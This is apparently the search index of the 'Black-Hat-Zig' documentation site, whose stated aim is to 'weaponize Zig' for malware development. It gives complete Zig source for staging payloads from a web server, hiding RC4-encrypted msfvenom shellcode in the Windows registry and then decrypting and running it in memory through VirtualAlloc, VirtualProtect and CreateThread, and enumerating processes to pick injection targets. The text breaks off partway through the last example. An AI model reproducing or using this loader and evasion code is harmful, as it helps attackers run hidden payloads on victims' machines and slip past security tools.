{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Intro to Black-Hat-Zig","text":"<p> Hello hackers. Hello maldevs. Hello reversers. Nice to see you here to explore the dark power of Zig! Maintained and managed by @CX330Blake </p>"},{"location":"#intro","title":"Intro","text":"<p>This project is continuously updating!</p> <p>This project provides many malware techniques implementation using Zig since I'm a huge fan of it. You can use this repo to weaponize Zig. Black-Hat-Zig is continuously updating to make sure it contains as more content as it could. It will be perfect if you want to create a PR for this project.</p> <p>Okay, let's hack the planet!</p>"},{"location":"#why-zig","title":"Why Zig?","text":"<ul> <li>\ud83e\udd1d Easy to interact with C/C++ source</li> <li>\ud83d\udd0e It's newer, so it's harder to be detect</li> <li>\ud83d\udcaa Strongly low level control, even lower than C</li> <li>\ud83d\ude31 It's harder to RE because of the modern compiler</li> <li>\ud83d\udee1\ufe0f Minimal runtime dependencies - No massive standard library footprint</li> <li>\ud83c\udfaf No undefined behavior - Explicit handling of edge cases prevents crashes</li> </ul>"},{"location":"#contributors","title":"Contributors","text":"<p>This project is mainly maintained &amp; managed by @CX330Blake. PRs are welcomed. Hope there's more people use Zig for malware developing so the ecosystem will be more mature.</p> <p>Huge thanks for these contributors!</p> <p> </p>"},{"location":"#credits-references","title":"Credits &amp; References","text":"<ul> <li>Maldev Academy</li> <li>OffensiveNim</li> </ul>"},{"location":"#star-history","title":"Star History","text":""},{"location":"#disclaimer","title":"Disclaimer","text":"<p>This project is for ethical and educational purpose only. Don't be a cyber criminal.</p>"},{"location":"epilogue/","title":"Epilogue","text":"Thanks for reading this!     Give Black-Hat-Zig a star if you like it!"},{"location":"prologue/","title":"Before We Start","text":""},{"location":"prologue/#prerequisites","title":"Prerequisites","text":"<ul> <li>Windows environment<ul> <li>The code can be compiled on Linux/MacOS, but still need a Windows environment to execute</li> </ul> </li> <li>Zig &gt;= 0.14.0</li> <li>ZYPE installed<ul> <li>ZYPE is a tool we will often used here. To install, please visit ZYPE</li> </ul> </li> </ul>"},{"location":"prologue/#compiling-the-codes","title":"Compiling The Codes","text":"<p>The compilation is easy thanks to the good support for Zig's cross compilation. To build a Windows binary, we have three way to achieve it.</p> <ol> <li>Add <code>-Dtarget</code> flag to the <code>zig build</code> or <code>zig build-exe</code> command during the compilation.</li> <li>Simply run <code>zig-build</code> or <code>zig-build-exe</code> on a Windows machine.</li> <li>Set the default target architecture and OS in the <code>build.zig</code>.</li> </ol> <p>Here we'll use the third method to do this, so that no matter which OS you're using, you can simply run <code>zig build</code> to build the binary. For more details, this is the configuration I set for every projects that depend on Windows API.</p> <pre><code>const target = b.standardTargetOptions(.{ .default_target = .{\n    .cpu_arch = .x86_64,\n    .os_tag = .windows\n}});\n</code></pre>"},{"location":"prologue/#other-useful-tools","title":"Other Useful Tools","text":"<ul> <li>ZYRA: Your Runtime Armor<ul> <li>An executable packer written in Zig</li> </ul> </li> <li>ZYPE: Your Payload Encryptor<ul> <li>MSFvenom shellcode got detected? ZYPE encrypt and obfuscate the shellcode for you!</li> </ul> </li> </ul>"},{"location":"Advanced-Malware-Techniques/intro/","title":"Advanced Malware Techniques","text":"<p>Here we explore sophisticated approaches for staging and executing malware. These chapters cover:</p> <ul> <li>Process injection and thread hijacking</li> <li>Payload staging (web servers, Windows registry, etc.)</li> <li>Callback-based code execution</li> <li>Enumerating processes to find suitable targets</li> </ul> <p>These techniques build on the basics and demonstrate how real-world malware maintains stealth and control.</p>"},{"location":"Advanced-Malware-Techniques/Payload-Staging/web_server/","title":"Using Web Server","text":""},{"location":"Advanced-Malware-Techniques/Payload-Staging/web_server/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p>Payload staging via web server downloads the malicious code from a remote location when the program executes. By keeping the payload off disk until it is needed, this method reduces the signature of the binary and allows attackers to deliver updated payloads on demand. The example sets up an HTTP request to a specified URL, retrieves the binary data, and then executes the downloaded shellcode directly in memory. Staging payloads remotely also facilitates command and control style operations and can complicate forensic analysis.</p>"},{"location":"Advanced-Malware-Techniques/Payload-Staging/web_server/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Python -m http.server 8000\n// Have calc.bin in the directory\n// Change this URL if you need\nconst PAYLOAD: [*:0]const u16 = std.unicode.utf8ToUtf16LeStringLiteral(\"http://127.0.0.1:8000/calc.bin\");\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst LPVOID = *anyopaque;\nconst LPCWSTR = [*:0]const u16;\nconst SIZE_T = usize;\nconst PBYTE = [*]u8;\n\n// WinInet types\nconst HINTERNET = *anyopaque;\n\n// WinInet constants\nconst INTERNET_FLAG_HYPERLINK = 0x00000400;\nconst INTERNET_FLAG_IGNORE_CERT_DATE_INVALID = 0x00002000;\nconst INTERNET_OPTION_SETTINGS_CHANGED = 39;\nconst LPTR = 0x0040;\nconst LMEM_MOVEABLE = 0x0002;\nconst LMEM_ZEROINIT = 0x0040;\n\n// Windows API function declarations\nextern \"kernel32\" fn GetLastError() callconv(.C) DWORD;\nextern \"kernel32\" fn LocalAlloc(uFlags: DWORD, uBytes: SIZE_T) callconv(.C) ?LPVOID;\nextern \"kernel32\" fn LocalReAlloc(hMem: LPVOID, uBytes: SIZE_T, uFlags: DWORD) callconv(.C) ?LPVOID;\nextern \"kernel32\" fn LocalFree(hMem: LPVOID) callconv(.C) LPVOID;\n\n// WinInet API function declarations\nextern \"wininet\" fn InternetOpenW(lpszAgent: LPCWSTR, dwAccessType: DWORD, lpszProxy: ?LPCWSTR, lpszProxyBypass: ?LPCWSTR, dwFlags: DWORD) callconv(.C) ?HINTERNET;\n\nextern \"wininet\" fn InternetOpenUrlW(hInternet: HINTERNET, lpszUrl: LPCWSTR, lpszHeaders: ?LPCWSTR, dwHeadersLength: DWORD, dwFlags: DWORD, dwContext: usize) callconv(.C) ?HINTERNET;\n\nextern \"wininet\" fn InternetReadFile(hFile: HINTERNET, lpBuffer: LPVOID, dwNumberOfBytesToRead: DWORD, lpdwNumberOfBytesRead: *DWORD) callconv(.C) BOOL;\n\nextern \"wininet\" fn InternetCloseHandle(hInternet: HINTERNET) callconv(.C) BOOL;\n\nextern \"wininet\" fn InternetSetOptionW(hInternet: ?HINTERNET, dwOption: DWORD, lpBuffer: ?LPVOID, dwBufferLength: DWORD) callconv(.C) BOOL;\n\n// Get a file's payload from a url (http or https)\n// Return a base address of a heap allocated buffer, thats the payload\n// Return the payload's size\nfn getPayloadFromUrl(sz_url: LPCWSTR, p_payload_bytes: *?PBYTE, s_payload_size: *SIZE_T) BOOL {\n    var h_internet: ?HINTERNET = null;\n    var h_internet_file: ?HINTERNET = null;\n    var p_tmp_bytes: ?LPVOID = null;\n    var p_bytes: ?LPVOID = null;\n\n    // Use defer to ensure cleanup happens regardless of how function exits\n    defer {\n        if (h_internet) |internet| {\n            _ = InternetCloseHandle(internet);\n            _ = InternetSetOptionW(null, INTERNET_OPTION_SETTINGS_CHANGED, null, 0);\n        }\n        if (h_internet_file) |file| {\n            _ = InternetCloseHandle(file);\n        }\n        if (p_tmp_bytes) |tmp| {\n            _ = LocalFree(tmp);\n        }\n    }\n\n    var dw_bytes_read: DWORD = 0;\n    var s_size: SIZE_T = 0; // Used as the total payload size\n\n    // Opening the internet session handle, all arguments are NULL here since no proxy options are required\n    h_internet = InternetOpenW(std.unicode.utf8ToUtf16LeStringLiteral(\"Black-Hat-Zig\"), 0, // NULL\n        null, null, 0 // NULL\n    );\n\n    if (h_internet == null) {\n        print(\"[!] InternetOpenW Failed With Error : {d} \\n\", .{GetLastError()});\n        return 0; // FALSE\n    }\n\n    // Opening the handle to the payload using the payload's URL\n    h_internet_file = InternetOpenUrlW(h_internet.?, sz_url, null, 0, // NULL\n        INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0 // NULL\n    );\n\n    if (h_internet_file == null) {\n        print(\"[!] InternetOpenUrlW Failed With Error : {d} \\n\", .{GetLastError()});\n        return 0; // FALSE\n    }\n\n    // Allocating 1024 bytes to the temp buffer\n    p_tmp_bytes = LocalAlloc(LPTR, 1024);\n    if (p_tmp_bytes == null) {\n        return 0; // FALSE\n    }\n\n    while (true) {\n        // Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.\n        if (InternetReadFile(h_internet_file.?, p_tmp_bytes.?, 1024, &amp;dw_bytes_read) == 0) {\n            print(\"[!] InternetReadFile Failed With Error : {d} \\n\", .{GetLastError()});\n            if (p_bytes) |bytes| {\n                _ = LocalFree(bytes);\n            }\n            return 0; // FALSE\n        }\n\n        // Calculating the total size of the total buffer\n        s_size += dw_bytes_read;\n\n        // In case the total buffer is not allocated yet\n        // then allocate it equal to the size of the bytes read since it may be less than 1024 bytes\n        if (p_bytes == null) {\n            p_bytes = LocalAlloc(LPTR, dw_bytes_read);\n        } else {\n            // Otherwise, reallocate the pBytes to equal to the total size, sSize.\n            // This is required in order to fit the whole payload\n            p_bytes = LocalReAlloc(p_bytes.?, s_size, LMEM_MOVEABLE | LMEM_ZEROINIT);\n        }\n\n        if (p_bytes == null) {\n            return 0; // FALSE\n        }\n\n        // Append the temp buffer to the end of the total buffer\n        const dest_ptr = @as([*]u8, @ptrCast(p_bytes.?)) + (s_size - dw_bytes_read);\n        @memcpy(dest_ptr[0..dw_bytes_read], @as([*]u8, @ptrCast(p_tmp_bytes.?))[0..dw_bytes_read]);\n\n        // Clean up the temp buffer\n        @memset(@as([*]u8, @ptrCast(p_tmp_bytes.?))[0..dw_bytes_read], 0);\n\n        // If less than 1024 bytes were read it means the end of the file was reached\n        // Therefore exit the loop\n        if (dw_bytes_read &lt; 1024) {\n            break;\n        }\n\n        // Otherwise, read the next 1024 bytes\n    }\n\n    // Saving\n    p_payload_bytes.* = @ptrCast(p_bytes.?);\n    s_payload_size.* = s_size;\n\n    return 1; // TRUE\n}\n\npub fn main() !void {\n    var size: SIZE_T = 0;\n    var bytes: ?PBYTE = null;\n\n    // Reading the payload\n    if (getPayloadFromUrl(PAYLOAD, &amp;bytes, &amp;size) == 0) {\n        std.process.exit(1);\n    }\n\n    // Ensure we free the memory when done\n    defer if (bytes) |b| {\n        _ = LocalFree(b);\n    };\n\n    print(\"[i] Bytes : 0x{X} \\n\", .{@intFromPtr(bytes.?)});\n    print(\"[i] Size  : {d} \\n\", .{size});\n\n    // Printing it\n    const payload_bytes = @as([*]u8, @ptrCast(bytes.?))[0..size];\n    for (payload_bytes, 0..) |byte, i| {\n        if (i % 16 == 0) {\n            print(\"\\n\\t\", .{});\n        }\n        print(\"{X:0&gt;2} \", .{byte});\n    }\n    print(\"\\n\\n\", .{});\n\n    print(\"[#] Press &lt;Enter&gt; To Quit ... \", .{});\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Payload-Staging/windows_registry/","title":"Using Windows Registry","text":""},{"location":"Advanced-Malware-Techniques/Payload-Staging/windows_registry/#tldr","title":"TL;DR","text":"<p>See the code example Another staging mechanism is to hide the payload inside the Windows Registry. Malware can write encrypted shellcode to a registry value and later read it back when execution is desired. Because registry entries are less scrutinized than files on disk, this method provides a stealthy form of persistence. The example offers both write and read modes, demonstrating how to store the payload under a selected key and then execute it from memory. Leveraging the registry in this way allows attackers to avoid leaving obvious artifacts on the filesystem.</p>"},{"location":"Advanced-Malware-Techniques/Payload-Staging/windows_registry/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\nconst kernel32 = windows.kernel32;\n\n// Uncomment one of the following to enable the read/write mode\nconst WRITEMODE = true; // Changed to false for READ MODE\nconst READMODE = !WRITEMODE; // Changed to true for READ MODE\n\n// I/O registry key to read/write\nconst REGISTRY = \"Control Panel\";\nconst REGSTRING = \"Black-Hat-Zig\";\n\n// Windows API types\nconst HANDLE = windows.HANDLE;\nconst DWORD = windows.DWORD;\nconst BOOL = windows.BOOL;\nconst LPVOID = *anyopaque;\nconst PVOID = *anyopaque;\nconst PBYTE = [*]u8;\nconst SIZE_T = usize;\nconst LSTATUS = i32;\nconst NTSTATUS = i32;\n\n// Registry constants\nconst HKEY_CURRENT_USER = @as(windows.HKEY, @ptrFromInt(0x80000001));\nconst KEY_SET_VALUE = 0x0002;\nconst REG_BINARY = 3;\nconst RRF_RT_ANY = 0x0000FFFF;\nconst ERROR_SUCCESS = 0;\n\n// Memory constants\nconst MEM_COMMIT = 0x1000;\nconst MEM_RESERVE = 0x2000;\nconst PAGE_READWRITE = 0x04;\nconst PAGE_EXECUTE_READWRITE = 0x40;\nconst HEAP_ZERO_MEMORY = 0x00000008;\n\n// USTRING structure for SystemFunction032\nconst USTRING = extern struct {\n    Length: DWORD,\n    MaximumLength: DWORD,\n    Buffer: PVOID,\n};\n\n// Windows API function declarations\nextern \"kernel32\" fn GetLastError() callconv(.C) DWORD;\nextern \"kernel32\" fn GetProcessHeap() callconv(.C) HANDLE;\nextern \"kernel32\" fn HeapAlloc(hHeap: HANDLE, dwFlags: DWORD, dwBytes: SIZE_T) callconv(.C) ?LPVOID;\nextern \"kernel32\" fn HeapFree(hHeap: HANDLE, dwFlags: DWORD, lpMem: LPVOID) callconv(.C) BOOL;\nextern \"kernel32\" fn VirtualAlloc(lpAddress: ?LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD) callconv(.C) ?LPVOID;\nextern \"kernel32\" fn VirtualProtect(lpAddress: LPVOID, dwSize: SIZE_T, flNewProtect: DWORD, lpflOldProtect: *DWORD) callconv(.C) BOOL;\nextern \"kernel32\" fn CreateThread(lpThreadAttributes: ?*anyopaque, dwStackSize: SIZE_T, lpStartAddress: *const fn (?LPVOID) callconv(.C) DWORD, lpParameter: ?LPVOID, dwCreationFlags: DWORD, lpThreadId: ?*DWORD) callconv(.C) ?HANDLE;\nextern \"kernel32\" fn LoadLibraryA(lpLibFileName: [*:0]const u8) callconv(.C) ?HANDLE;\nextern \"kernel32\" fn GetProcAddress(hModule: HANDLE, lpProcName: [*:0]const u8) callconv(.C) ?*anyopaque;\n\nextern \"advapi32\" fn RegOpenKeyExA(hKey: windows.HKEY, lpSubKey: [*:0]const u8, ulOptions: DWORD, samDesired: DWORD, phkResult: *windows.HKEY) callconv(.C) LSTATUS;\nextern \"advapi32\" fn RegSetValueExA(hKey: windows.HKEY, lpValueName: [*:0]const u8, Reserved: DWORD, dwType: DWORD, lpData: [*]const u8, cbData: DWORD) callconv(.C) LSTATUS;\nextern \"advapi32\" fn RegGetValueA(hKey: windows.HKEY, lpSubKey: ?[*:0]const u8, lpValue: [*:0]const u8, dwFlags: DWORD, pdwType: ?*DWORD, pvData: ?LPVOID, pcbData: *DWORD) callconv(.C) LSTATUS;\nextern \"advapi32\" fn RegCloseKey(hKey: windows.HKEY) callconv(.C) LSTATUS;\n\n// Helper function to wait for Enter key\nfn waitForEnter() void {\n    var buffer: [256]u8 = undefined;\n    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\\n') catch {};\n}\n\nconst fnSystemFunction032 = fn (\n    Data: *USTRING,\n    Key: *USTRING,\n) callconv(.C) NTSTATUS;\n\n/// Helper function that calls SystemFunction032 (RC4)\n/// Reference: https://osandamalith.com/2022/11/10/encrypting-shellcode-using-systemfunction032-033/\npub fn rc4EncryptionViaSystemFunc032(\n    rc4Key: []u8,\n    payloadData: []u8,\n) bool {\n    // Prepare the USTRING structs\n    var Data = USTRING{\n        .Buffer = payloadData.ptr,\n        .Length = @intCast(payloadData.len),\n        .MaximumLength = @intCast(payloadData.len),\n    };\n    var Key = USTRING{\n        .Buffer = rc4Key.ptr,\n        .Length = @intCast(rc4Key.len),\n        .MaximumLength = @intCast(rc4Key.len),\n    };\n\n    // Convert \"Advapi32\" to UTF-16LE for LoadLibraryW\n    const advapi32_w = std.unicode.utf8ToUtf16LeStringLiteral(\"Advapi32\");\n    const advapi32 = kernel32.LoadLibraryW(advapi32_w);\n    if (advapi32 == null) {\n        std.debug.print(\"[!] LoadLibraryW failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n    defer _ = kernel32.FreeLibrary(advapi32.?);\n\n    const proc_addr = kernel32.GetProcAddress(advapi32.?, \"SystemFunction032\");\n    if (proc_addr == null) {\n        std.debug.print(\"[!] GetProcAddress failed: {}\\n\", .{kernel32.GetLastError()});\n        return false;\n    }\n\n    const SystemFunction032: *const fnSystemFunction032 = @ptrCast(proc_addr);\n\n    const status: NTSTATUS = SystemFunction032(&amp;Data, &amp;Key);\n\n    if (status != 0) {\n        std.debug.print(\"[!] SystemFunction032 FAILED With Error: 0x{X:0&gt;8}\\n\", .{status});\n        return false;\n    }\n    return true;\n}\n\n// RC4 key - CHANGED: Made it a var so we can create a mutable copy\nvar RC4_KEY = [_]u8{\n    0x8B, 0x9E, 0x3F, 0xC0, 0x3E, 0x31, 0xBF, 0xCF, 0xA5, 0x83, 0x7C, 0xC8, 0x6A, 0x61, 0x96, 0x9A,\n};\n\n// Msfvenom x64 calc shellcode encrypted by HellShell [RC4]\nconst RC4_CIPHER_TEXT = [_]u8{\n    0x3F, 0x8C, 0x01, 0xCA, 0x70, 0x80, 0x3F, 0x6B, 0xE3, 0x7B, 0x77, 0xF2, 0x05, 0x77, 0x0E, 0x97,\n    0x01, 0xD4, 0x45, 0x48, 0x65, 0xAA, 0x64, 0xD1, 0x04, 0xA1, 0xEB, 0xDF, 0x6E, 0x3C, 0x86, 0xDF,\n    0x53, 0x89, 0xD4, 0x33, 0x87, 0x09, 0x9D, 0xF5, 0xB0, 0x25, 0xA3, 0xB0, 0xFA, 0x47, 0xA1, 0x8B,\n    0x54, 0x36, 0x5D, 0x2A, 0x12, 0x6D, 0x9D, 0xCC, 0x37, 0x1B, 0x44, 0x4D, 0x1C, 0xD2, 0x0B, 0x26,\n    0x41, 0xC8, 0x55, 0x14, 0xBD, 0x0A, 0xEF, 0x93, 0x3A, 0x4B, 0xA2, 0x3D, 0xF9, 0x67, 0x6E, 0xB4,\n    0x68, 0x66, 0x44, 0xE2, 0x5D, 0xC9, 0xE6, 0xF7, 0xE9, 0x99, 0x68, 0x5E, 0x5E, 0xB0, 0x5E, 0xDE,\n    0xB6, 0xF6, 0x66, 0x85, 0xF5, 0xEA, 0xA1, 0xB4, 0x4C, 0xF9, 0x70, 0xF4, 0xA2, 0x65, 0x33, 0xBD,\n    0x5F, 0xD6, 0x55, 0x1A, 0x96, 0x51, 0x59, 0xE7, 0x13, 0x04, 0x10, 0x27, 0x46, 0x41, 0xBB, 0x1A,\n    0xBC, 0x31, 0x46, 0x6E, 0x74, 0x72, 0x6D, 0x3F, 0xFE, 0x46, 0x1D, 0x55, 0x84, 0xA6, 0x24, 0x04,\n    0x3B, 0xE1, 0x16, 0x21, 0x1F, 0xFA, 0xA4, 0x4E, 0x34, 0x91, 0x02, 0x55, 0x2B, 0xE1, 0xAD, 0xD3,\n    0x7B, 0x52, 0xE8, 0xF3, 0xBF, 0x25, 0x17, 0xD9, 0x1B, 0xB7, 0x75, 0x01, 0x35, 0xF2, 0x5C, 0x94,\n    0xA6, 0xCF, 0x92, 0xA1, 0x09, 0x23, 0x9C, 0x66, 0x73, 0x5E, 0x1A, 0xC5, 0xBD, 0xE2, 0x78, 0x60,\n    0x9F, 0xC9, 0xF5, 0xFD, 0xE4, 0xD3, 0x02, 0x8F, 0x10, 0x11, 0x62, 0xFD, 0x0E, 0x80, 0xD3, 0x2E,\n    0x87, 0x73, 0xB1, 0x9A, 0x75, 0xA6, 0x49, 0x1C, 0x8E, 0x2F, 0x6C, 0x28, 0xB6, 0xB8, 0x09, 0x18,\n    0x71, 0x73, 0x7D, 0x97, 0x97, 0x67, 0xEF, 0xA5, 0x8D, 0x07, 0xD6, 0xDB, 0x43, 0x1F, 0x03, 0x31,\n    0x6E, 0x91, 0x87, 0x9A, 0xDC, 0x12, 0xE7, 0x3C, 0xBA, 0x94, 0x79, 0xA7, 0x19, 0xAF, 0xBB, 0xE5,\n    0x0B, 0x0F, 0xF5, 0xB9, 0x41, 0xD4, 0x4C, 0x8B, 0x63, 0xAF, 0xEE, 0xC8, 0xAF, 0x7C, 0xC9, 0xBE,\n};\n\n// Function that reads the payload from the registry key\nfn readShellcodeFromRegistry() ![]u8 {\n    var dw_bytes_read: DWORD = 0;\n\n    // Fetching the payload's size\n    var status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, null, null, &amp;dw_bytes_read);\n    if (status != ERROR_SUCCESS) {\n        print(\"[!] RegGetValueA Failed With Error : {d}\\n\", .{status});\n        return error.RegGetValueFailed;\n    }\n\n    // Allocating heap that will store the payload that will be read\n    const p_bytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dw_bytes_read) orelse {\n        print(\"[!] HeapAlloc Failed With Error : {d}\\n\", .{GetLastError()});\n        return error.HeapAllocFailed;\n    };\n\n    // Reading the payload from \"REGISTRY\" key, from value \"REGSTRING\"\n    status = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, null, p_bytes, &amp;dw_bytes_read);\n    if (status != ERROR_SUCCESS) {\n        print(\"[!] RegGetValueA Failed With Error : {d}\\n\", .{status});\n        _ = HeapFree(GetProcessHeap(), 0, p_bytes);\n        return error.RegGetValueFailed;\n    }\n\n    return @as([*]u8, @ptrCast(p_bytes))[0..dw_bytes_read];\n}\n\n// Function that writes the payload to the registry key\nfn writeShellcodeToRegistry(shellcode: []const u8) !void {\n    var h_key: windows.HKEY = undefined;\n\n    print(\"[i] Writing 0x{X} [ Size: {d} ] to \\\"{s}\\\\{s}\\\" ... \\n\", .{ @intFromPtr(shellcode.ptr), shellcode.len, REGISTRY, REGSTRING });\n\n    // Opening handle to \"REGISTRY\" registry key\n    var status = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &amp;h_key);\n    if (status != ERROR_SUCCESS) {\n        print(\"[!] RegOpenKeyExA Failed With Error : {d}\\n\", .{status});\n        return error.RegOpenKeyFailed;\n    }\n    defer _ = RegCloseKey(h_key);\n\n    // Creating string value \"REGSTRING\" and writing the payload to it as a binary value\n    status = RegSetValueExA(h_key, REGSTRING, 0, REG_BINARY, shellcode.ptr, @intCast(shellcode.len));\n    if (status != ERROR_SUCCESS) {\n        print(\"[!] RegSetValueExA Failed With Error : {d}\\n\", .{status});\n        return error.RegSetValueFailed;\n    }\n\n    print(\"[+] DONE ! \\n\", .{});\n}\n\n// Local shellcode execution\nfn runShellcode(decrypted_shellcode: []const u8) !void {\n    const shellcode_address = VirtualAlloc(null, decrypted_shellcode.len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) orelse {\n        print(\"[!] VirtualAlloc Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.VirtualAllocFailed;\n    };\n\n    print(\"[i] Allocated Memory At : 0x{X} \\n\", .{@intFromPtr(shellcode_address)});\n\n    @memcpy(@as([*]u8, @ptrCast(shellcode_address))[0..decrypted_shellcode.len], decrypted_shellcode);\n\n    var old_protection: DWORD = 0;\n    if (VirtualProtect(shellcode_address, decrypted_shellcode.len, PAGE_EXECUTE_READWRITE, &amp;old_protection) == 0) {\n        print(\"[!] VirtualProtect Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.VirtualProtectFailed;\n    }\n\n    print(\"[#] Press &lt;Enter&gt; To Run ... \", .{});\n    waitForEnter();\n\n    const thread_handle = CreateThread(null, 0, @ptrCast(shellcode_address), null, 0, null) orelse {\n        print(\"[!] CreateThread Failed With Error : {d} \\n\", .{GetLastError()});\n        return error.CreateThreadFailed;\n    };\n\n    _ = thread_handle;\n}\n\npub fn main() !void {\n    if (comptime WRITEMODE) {\n        // Write the shellcode to the registry\n        print(\"[#] Press &lt;Enter&gt; To Write The Shellcode To The Registry...\", .{});\n        waitForEnter();\n\n        writeShellcodeToRegistry(&amp;RC4_CIPHER_TEXT) catch |err| {\n            print(\"[!] Failed to write shellcode to registry: {}\\n\", .{err});\n            std.process.exit(1);\n        };\n    }\n\n    if (comptime READMODE) {\n        print(\"[#] Press &lt;Enter&gt; To Read The Shellcode From The Registry...\", .{});\n        waitForEnter();\n\n        // Read the shellcode\n        print(\"[i] Reading Shellcode ... \\n\", .{});\n        const payload_bytes = readShellcodeFromRegistry() catch |err| {\n            print(\"[!] Failed to read shellcode from registry: {}\\n\", .{err});\n            std.process.exit(1);\n        };\n        defer _ = HeapFree(GetProcessHeap(), 0, @ptrCast(payload_bytes.ptr));\n\n        print(\"[+] DONE \\n\", .{});\n        print(\"[+] Payload Of Size [{d}] Read At : 0x{X} \\n\", .{ payload_bytes.len, @intFromPtr(payload_bytes.ptr) });\n\n        // Decrypting the shellcode\n        print(\"[#] Press &lt;Enter&gt; To Decrypt The Shellcode ...\", .{});\n        waitForEnter();\n        print(\"[i] Decrypting Shellcode ... \\n\", .{});\n\n        // FIXED: Pass RC4_KEY as a slice instead of pointer to array\n        if (!rc4EncryptionViaSystemFunc032(RC4_KEY[0..], payload_bytes)) {\n            print(\"[!] Failed to decrypt shellcode\\n\", .{});\n            std.process.exit(1);\n        }\n\n        print(\"[+] DONE \\n\", .{});\n\n        // Running the shellcode\n        runShellcode(payload_bytes) catch |err| {\n            print(\"[!] Failed to execute shellcode: {}\\n\", .{err});\n            std.process.exit(1);\n        };\n    }\n\n    print(\"[#] Press &lt;Enter&gt; To Quit ...\", .{});\n    waitForEnter();\n}\n</code></pre>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/create_tool_help_32_snapshot/","title":"Using CreateToolhelp32Snapshot","text":""},{"location":"Advanced-Malware-Techniques/Process-Enumeration/create_tool_help_32_snapshot/#tldr","title":"TL;DR","text":"<p>See the code example</p> <p><code>CreateToolhelp32Snapshot</code> allows us to capture a snapshot of the system's process list. By iterating through this snapshot with <code>Process32First</code> and <code>Process32Next</code>, we can collect information about every running process. Malware often enumerates processes to find suitable targets for injection or to avoid certain security tools. This example demonstrates how to traverse the snapshot, identify the desired process, and obtain its handle for later use in other techniques such as code injection.</p>"},{"location":"Advanced-Malware-Techniques/Process-Enumeration/create_tool_help_32_snapshot/#code-walkthrough","title":"Code Walkthrough","text":"main.zig<pre><code>const std = @import(\"std\");\nconst windows = std.os.windows;\nconst print = std.debug.print;\n\n// Windows API types\nconst DWORD = windows.DWORD;\nconst HANDLE = windows.HANDLE;\nconst BOOL = windows.BOOL;\nconst WINAPI = windows.WINAPI;\n\n// Configuration\nconst TARGET_PROCESS = \"svchost.exe\";\n\n// Convert UTF-8 to UTF-16 at compile time\nconst W = std.unicode.utf8ToUtf16LeStringLiteral;\n\n// Constants for CreateToolhelp32Snapshot\nconst TH32CS_SNAPPROCESS: DWORD = 0x00000002;\nconst INVALID_HANDLE_VALUE: HANDLE = @as(HANDLE, @ptrFromInt(@as(usize, @bitCast(@as(isize, -1)))));\nconst MAX_PATH: usize = 260;\n\n// PROCESSENTRY32W structure\nconst PROCESSENTRY32W = extern struct {\n    dwSize: DWORD,\n    cntUsage: DWORD,\n    th32ProcessID: DWORD,\n    th32DefaultHeapID: usize, // ULONG_PTR\n    th32ModuleID: DWORD,\n    cntThreads: DWORD,\n    th32ParentProcessID: DWORD,\n    pcPriClassBase: i32, // LONG\n    dwFlags: DWORD,\n    szExeFile: [MAX_PATH]u16, // WCHAR[MAX_PATH]\n};\n\n// External function declarations for ToolHelp32 API\nextern \"kernel32\" fn CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD) callconv(WINAPI) HANDLE;\nextern \"kernel32\" fn Process32FirstW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn Process32NextW(hSnapshot: HANDLE, lppe: *PROCESSENTRY32W) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn CloseHandle(hObject: HANDLE) callconv(WINAPI) BOOL;\nextern \"kernel32\" fn GetLastError() callconv(WINAPI) DWORD;\nextern \"kernel32\" fn OpenProcess(dwDesiredAccess: DWORD, bInheritHandle: BOOL, dwProcessId: DWORD) callconv(WINAPI) ?HANDLE;\n\n// Constants\nconst PROCESS_ALL_ACCESS = 0x001F0FFF;\n\n// ProcessResult structure\nconst ProcessResult = struct {\n    pid: DWORD,\n    handle: HANDLE,\n\n    pub fn deinit(self: ProcessResult) void {\n        _ = CloseHandle(self.handle);\n    }\n};\n\n// Helper function to convert UTF-8 string to UTF-16 (wide string)\nfn convertToWideString(allocator: std.mem.Allocator, utf8_str: []const u8) ![]u16 {\n    const utf16_len = try std.unicode.calcUtf16LeLen(utf8_str);\n    var wide_string = try allocator.alloc(u16, utf16_len + 1);\n\n    _ = try std.unicode.utf8ToUtf16Le(wide_string[0..utf16_len], utf8_str);\n    wide_string[utf16_len] = 0; // Null terminate\n\n    return wide_string;\n}\n\n// Helper function to compare wide strings (case-insensitive)\nfn compareWideStringsIgnoreCase(str1: []const u16, str2: []const u16) bool {\n    if (str1.len != str2.len) return false;\n\n    for (str1, str2) |c1, c2| {\n        // Simple case-insensitive comparison for ASCII range\n        const lower_c1 = if (c1 &gt;= 'A' and c1 &lt;= 'Z') c1 + 32 else c1;\n        const lower_c2 = if (c2 &gt;= 'A' and c2 &lt;= 'Z') c2 + 32 else c2;\n        if (lower_c1 != lower_c2) return false;\n    }\n    return true;\n}\n\n// Get remote process PID by name using CreateToolhelp32Snapshot (equivalent to your 